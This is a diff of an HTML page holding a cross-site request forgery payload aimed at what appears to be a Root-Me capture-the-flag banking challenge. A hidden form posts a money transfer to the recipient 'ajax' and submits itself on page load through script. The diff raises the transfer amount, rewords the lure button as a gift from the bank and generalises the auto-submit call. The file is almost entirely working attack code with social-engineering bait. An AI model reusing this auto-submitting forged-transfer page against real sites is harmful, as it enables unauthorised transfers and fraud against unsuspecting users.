@@ -6,13 +6,13 @@
     <title>Document</title>
 </head>
 <body>
-    <form id="malicious" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
         <input type="hidden" name="recipient" value="ajax">
-        <input type="hidden" name="amount" value="1513699513" />
-        <button type="submit">Petit cadeau</button>
+        <input type="hidden" name="amount" value="1000000" />
+        <button type="submit">Petit cadeau de la banque pour vous</button>
      </form>
      <script>
-        document.getElementById('malicious').submit();
+        document.forms[0].submit();
      </script>
 </body>
 </html>
